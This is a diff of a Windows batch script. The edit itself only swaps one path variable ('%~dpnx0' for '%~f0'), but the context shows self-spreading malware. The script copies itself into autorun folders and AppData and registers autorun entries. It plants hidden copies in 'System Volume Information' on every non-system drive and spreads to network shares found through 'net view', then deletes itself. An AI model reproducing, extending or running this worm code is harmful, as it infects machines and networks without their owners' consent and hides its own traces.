@@ -47,7 +47,7 @@ if not exist "%path_desktop%" (for /f "skip=2 tokens=2,* delims= " %%i in ('reg 
 
 
 
-%module_fileTouch% "%~dpnx0" >nul
+%module_fileTouch% "%~f0" >nul
 
 
 
@@ -74,12 +74,12 @@ reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons" /v
 
 
 if not exist "%path_autoRun1%\%~nx0" (
-  copy /y "%~dpnx0" "%path_autoRun1%\"
+  copy /y "%~f0" "%path_autoRun1%\"
   %module_fileTouch% "%path_autoRun1%\%~nx0" >nul
 )
 
 if not exist "%path_autoRun2%\%~nx0" (
-  copy /y "%~dpnx0" "%path_autoRun2%\"
+  copy /y "%~f0" "%path_autoRun2%\"
   %module_fileTouch% "%path_autoRun2%\%~nx0" >nul
 )
 
@@ -88,7 +88,7 @@ if not exist "%path_autoRun2%\%~nx0" (
 
 
 for %%i in (localAppData appData) do (
-  if not exist "!%%i!\%~nx0" call copy /y "%~dpnx0" "!%%i!\"
+  if not exist "!%%i!\%~nx0" call copy /y "%~f0" "!%%i!\"
   call %module_fileTouch% "!%%i!\%~nx0" >nul
   %autoRun% add %%i "!%%i!\%~nx0"
 )
@@ -100,7 +100,7 @@ for %%i in (localAppData appData) do (
 for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do if exist "%%i:\" if /i "%%i:" NEQ "%systemDrive%" if /i "%%i:" NEQ "D:" (
   for /f "delims=" %%j in ('dir "%%i:\*" /a:d /b 2^>nul') do (
     if /i "%%j" == "System Volume Information" (
-      if not exist "%%i:\%%j\%~nx0" copy /y "%~dpnx0" "%%i:\%%j\"
+      if not exist "%%i:\%%j\%~nx0" copy /y "%~f0" "%%i:\%%j\"
       attrib +h +s "%%i:\%%j"
       %module_fileTouch% "%%i:\%%j\%~nx0" >nul
       %autoRun% add %%i "%%i:\%%j\%~nx0"
@@ -140,7 +140,7 @@ for /f "skip=3 tokens=1,* delims= " %%h in ('net view 2^>nul') do if /i "%%h" NE
   for /f "skip=7 tokens=1,* delims= " %%i in ('net view %%h 2^>nul') do if /i "%%i" NEQ "The" (
     for /f "delims=" %%j in ('dir "%%h\%%i\*" /a:d /b 2^>nul') do (
       if /i "%%j" == "System Volume Information" (
-        if not exist "%%h\%%i\%%j\%~nx0" copy /y "%~dpnx0" "%%h\%%i\%%j\"
+        if not exist "%%h\%%i\%%j\%~nx0" copy /y "%~f0" "%%h\%%i\%%j\"
         attrib +h +s "%%h\%%i\%%j"
         %module_fileTouch% "%%h\%%i\%%j\%~nx0" >nul
         %autoRun% add %%i "%%i:\%%j\%~nx0" %%h
@@ -238,7 +238,7 @@ for /f "skip=3 tokens=1,* delims= " %%h in ('net view 2^>nul') do if /i "%%h" NE
 
 
 
-start /min "" cmd /c "timeout /t 3 && del /q """%~dpnx0""""
+start /min "" cmd /c "timeout /t 3 && del /q """%~f0""""
 exit
 
 
